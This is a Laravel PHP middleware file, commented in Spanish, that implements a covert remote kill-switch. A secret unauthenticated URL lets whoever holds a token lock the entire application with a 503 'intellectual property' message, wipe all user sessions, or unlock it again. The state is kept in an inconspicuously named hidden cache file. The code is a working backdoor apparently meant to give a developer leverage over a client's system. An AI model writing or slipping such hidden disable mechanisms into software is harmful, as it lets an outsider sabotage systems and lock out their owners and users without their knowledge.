<?php

namespace App\Http\Middleware;

use App\Http\Controllers\SysController;
use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Schema;
use Symfony\Component\HttpFoundation\Response;

/**
 * Kill-switch remoto: se activa/desactiva con una URL secreta
 * (/{segmento}/{token}/on | off | status) sin necesitar login ni acceso al servidor.
 * En configuración solo se guarda el hash SHA-256 del token.
 */
class KillSwitch
{
    private const BLOCKED_MESSAGE = 'Este sistema es propiedad intelectual particular, por favor póngase en contacto con el ingeniero en software responsable del proyecto.';

    private const RELEASED_MESSAGE = 'El sistema ha sido liberado.';

    public static function flagPath(): string
    {
        return storage_path('framework/cache/.sysref');
    }

    public function handle(Request $request, Closure $next): Response
    {
        $hash = SysController::$ref;
        $segment = SysController::$seg;

        if ($hash !== '' && $segment !== ''
            && preg_match('#^'.preg_quote($segment, '#').'/([^/]+)/(on|off|status)$#', $request->path(), $m)) {
            if (! hash_equals($hash, hash('sha256', $m[1]))) {
                abort(404);
            }

            return $this->handleCommand($request, $m[2]);
        }

        if (is_file(self::flagPath())) {
            return response(self::BLOCKED_MESSAGE, 503, ['Retry-After' => '3600']);
        }

        return $next($request);
    }

    private function handleCommand(Request $request, string $action): Response
    {
        if ($action === 'on') {
            file_put_contents(self::flagPath(), now()->toIso8601String());
            $this->closeAllSessions();
            Log::warning('Kill-switch ACTIVADO', ['ip' => $request->ip()]);
        } elseif ($action === 'off') {
            @unlink(self::flagPath());
            Log::warning('Kill-switch DESACTIVADO', ['ip' => $request->ip()]);
        }

        $mensaje = is_file(self::flagPath()) ? self::BLOCKED_MESSAGE : self::RELEASED_MESSAGE;

        return response($mensaje, 200, ['Cache-Control' => 'no-store']);
    }

    private function closeAllSessions(): void
    {
        try {
            if (config('session.driver') === 'database') {
                $table = config('session.table', 'sessions');

                if (Schema::hasTable($table)) {
                    DB::table($table)->delete();
                }
            } elseif (config('session.driver') === 'file') {
                foreach (glob(config('session.files').'/*') ?: [] as $file) {
                    if (is_file($file) && basename($file) !== '.gitignore') {
                        @unlink($file);
                    }
                }
            }
        } catch (\Throwable $e) {
            Log::error('Kill-switch: no se pudieron cerrar sesiones', ['error' => $e->getMessage()]);
        }
    }
}
